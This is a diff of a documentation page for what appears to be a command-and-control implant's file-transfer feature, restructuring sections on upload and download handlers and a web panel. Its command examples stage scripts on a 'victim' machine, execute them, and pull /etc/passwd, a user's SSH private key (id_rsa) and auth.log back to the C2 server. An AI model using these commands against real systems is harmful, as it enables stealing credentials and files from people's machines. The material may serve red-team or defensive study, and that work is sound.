@@ -3,7 +3,7 @@ title: "File Transfer"
 description: "Upload and download files between C2 server and victim system"
 icon: "download"
 date: "2025-05-25T00:00:00+01:00"
-lastmod: "2025-05-25T00:00:00+01:00"
+lastmod: "2025-05-30T00:00:00+01:00"
 draft: false
 toc: true
 weight: 511
@@ -13,20 +13,14 @@ weight: 511
 
 Transfer files between the C2 server and victim system using direct content transmission.
 
-## Upload Files
+## How It Works
 
-Upload files from C2 server to victim system.
+**Upload**: C2 → Victim system  
+**Download**: Victim system → C2
 
-### Usage
-```bash
-# Upload to specific path
-upload Client-1 ./config.txt /etc/myapp/config.txt
+## Implementation
 
-# Upload to current directory  
-upload Client-1 ./script.sh
-```
-
-### Implementation
+### Upload Handler
 ```c
 static int handle_upload(const char *data)
 {
@@ -49,20 +43,7 @@ static int handle_upload(const char *data)
 }
 ```
 
-## Download Files
-
-Download files from victim system to C2 server.
-
-### Usage
-```bash
-# Download to specific path
-download Client-1 /etc/passwd ./victim_passwd
-
-# Download to current directory
-download Client-1 /etc/hostname
-```
-
-### Implementation
+### Download Handler
 ```c
 static int handle_download(const char *data)
 {
@@ -82,26 +63,24 @@ static int handle_download(const char *data)
 }
 ```
 
-## WebUI Interface
+## Usage
 
-### Upload Panel
-- **File Selection**: Choose local file to upload
-- **Remote Path**: Specify destination path on victim
-- **Progress**: Real-time upload progress indicator
+### WebUI Interface
+- **Upload Panel**: File selection and remote path specification
+- **Download Panel**: File browser and batch downloads
 
-### Download Panel  
-- **File Browser**: Navigate victim filesystem
-- **Quick Downloads**: Common system files (passwd, hosts, etc.)
-- **Batch Download**: Select multiple files
+### C2 Commands
+```bash
+# Upload files
+upload Client-1 ./config.txt /etc/myapp/config.txt
+upload Client-1 ./script.sh /tmp/script.sh
 
-## Security Features
+# Download files
+download Client-1 /etc/passwd ./victim_passwd
+download Client-1 /etc/hostname
+```
 
-- **Path Validation**: Prevents directory traversal attacks
-- **File Size Limits**: 10MB maximum transfer size
-- **Permission Control**: Files created with safe permissions (0644)
-- **Error Handling**: Graceful failure on permission/space issues
-
-## Common Examples
+## Examples
 
 ```bash
 # System reconnaissance
@@ -117,3 +96,9 @@ exec Client-1 chmod +x /tmp/enum.sh
 download Client-1 /home/user/.ssh/id_rsa
 download Client-1 /var/log/auth.log
 ```
+
+## Technical Details
+
+- **File size limit**: 10MB maximum transfer
+- **Permissions**: Files created with 0644 permissions
+- **Error handling**: Graceful failure on permission/space issues
